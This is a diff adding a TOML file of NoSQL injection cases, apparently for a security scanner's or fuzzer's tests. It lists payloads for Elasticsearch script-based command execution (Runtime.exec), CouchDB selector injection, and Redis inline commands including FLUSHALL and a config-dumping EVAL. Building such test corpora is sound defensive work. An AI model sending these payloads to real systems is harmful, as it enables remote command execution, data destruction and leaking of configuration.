@@ -1,0 +1,45 @@
+schema = 1
+# Elasticsearch / CouchDB / Redis NoSQL injections.
+
+# Elasticsearch
+[[case]]
+id = "elastic_query_string"
+class = "nosql"
+payload = "{\"query\":{\"query_string\":{\"query\":\"*\"}}}"
+
+[[case]]
+id = "elastic_script_painless"
+class = "nosql"
+payload = "{\"script\":{\"source\":\"java.lang.Runtime.getRuntime().exec('id')\",\"lang\":\"painless\"}}"
+
+[[case]]
+id = "elastic_groovy_dynamic"
+class = "nosql"
+payload = "{\"script_fields\":{\"x\":{\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\")\"}}}"
+
+# CouchDB
+[[case]]
+id = "couch_users_inject"
+class = "nosql"
+payload = "{\"selector\":{\"_id\":{\"$gt\":null}}}"
+
+[[case]]
+id = "couch_revs_query"
+class = "nosql"
+payload = "{\"selector\":{\"$or\":[{\"x\":1},{\"y\":2}]}}"
+
+# Redis (via HTTP-confused services)
+[[case]]
+id = "redis_inline_set"
+class = "nosql"
+payload = "SET x evil\r\nSAVE\r\n"
+
+[[case]]
+id = "redis_inline_flushall"
+class = "nosql"
+payload = "FLUSHALL\r\n"
+
+[[case]]
+id = "redis_eval_lua"
+class = "nosql"
+payload = "EVAL \"return redis.call('config','get','*')\" 0"
